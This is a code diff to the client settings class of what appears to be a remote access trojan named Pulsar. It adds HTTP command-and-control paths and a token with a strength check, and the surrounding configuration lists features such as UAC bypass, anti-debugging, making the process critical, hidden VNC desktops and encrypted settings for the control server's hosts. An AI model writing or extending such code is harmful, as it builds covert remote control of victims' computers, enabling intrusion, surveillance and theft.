@@ -1,11 +1,10 @@
-﻿using Pulsar.Common.Cryptography;
+using Pulsar.Common.Cryptography;
 using Pulsar.Common.Models;
 using System;
 using System.IO;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
-using System.Windows.Forms;
 
 namespace Pulsar.Client.Config
 {
@@ -14,12 +13,14 @@ namespace Pulsar.Client.Config
     /// </summary>
     public static class Settings
     {
-    // Version string reported to the server regardless of assembly metadata.
-    private const string VersionOverride = "2.4.5";
+        // Version string reported to the server regardless of assembly metadata.
+        private const string VersionOverride = "2.4.5";
 
 #if DEBUG
         public static string VERSION = "1.0.0";
         public static string HOSTS = "127.0.0.1:4782;";
+        public static HttpC2Paths HTTPC2PATHS = new HttpC2Paths();
+        public static string HTTPC2TOKEN = "change-me";
         public static int RECONNECTDELAY = 500;
         public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
         public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
@@ -45,7 +46,7 @@ namespace Pulsar.Client.Config
         public static bool ANTIDEBUG = false;
         public static bool PASTEBIN = false;
         public static bool UACBYPASS = false;
-        public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process crititcal (needs admin fr)
+        public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process critical (requires administrator privileges)
 
         // needed for hvnc (why?) why not use the desktop pointer directly?
         public static IntPtr OriginalDesktopPointer = IntPtr.Zero;
@@ -53,11 +54,14 @@ namespace Pulsar.Client.Config
         public static bool Initialize()
         {
             SetupPaths();
+            ValidateHttpC2Config();
             return true;
         }
 #else
         public static string VERSION = "";
         public static string HOSTS = "";
+        public static HttpC2Paths HTTPC2PATHS = new HttpC2Paths();
+        public static string HTTPC2TOKEN = "change-me";
         public static int RECONNECTDELAY = 5000;
         public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
         public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
@@ -83,7 +87,7 @@ namespace Pulsar.Client.Config
         public static bool ANTIDEBUG = false;
         public static bool PASTEBIN = false;
         public static bool UACBYPASS = false;
-        public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process crititcal (needs admin fr)
+        public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process critical (requires administrator privileges)
 
         // needed for hvnc
         public static IntPtr OriginalDesktopPointer = IntPtr.Zero;
@@ -102,17 +106,53 @@ namespace Pulsar.Client.Config
             LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
             SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
             SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
+            HTTPC2PATHS = HttpC2PathValidator.Sanitize(HTTPC2PATHS, out _);
+            ValidateHttpC2Config();
             SetupPaths();
             return VerifyHash();
         }
 #endif
 
-    public static string ReportedVersion => string.IsNullOrWhiteSpace(VersionOverride) ? VERSION : VersionOverride;
+        public static string ReportedVersion => string.IsNullOrWhiteSpace(VersionOverride) ? VERSION : VersionOverride;
 
         static void SetupPaths()
         {
-            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
-            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
+            LOGSPATH = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                LOGDIRECTORYNAME);
+
+            INSTALLPATH = Path.Combine(
+                DIRECTORY,
+                (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
+        }
+
+        static void ValidateHttpC2Config()
+        {
+            HTTPC2PATHS = HttpC2PathValidator.Sanitize(HTTPC2PATHS, out _);
+
+            if (!IsStrongHttpC2Token(HTTPC2TOKEN))
+            {
+                throw new InvalidOperationException("HTTP C2: Token too weak or unset.");
+            }
+        }
+
+        public static bool IsStrongHttpC2Token(string token)
+        {
+            var trimmed = (token ?? string.Empty).Trim();
+            if (trimmed.Length < 32)
+            {
+                return false;
+            }
+
+            foreach (var c in trimmed)
+            {
+                if (!(char.IsLetterOrDigit(c) || c == '+' || c == '/' || c == '=' || c == '-' || c == '_'))
+                {
+                    return false;
+                }
+            }
+
+            return true;
         }
 
         static bool VerifyHash()
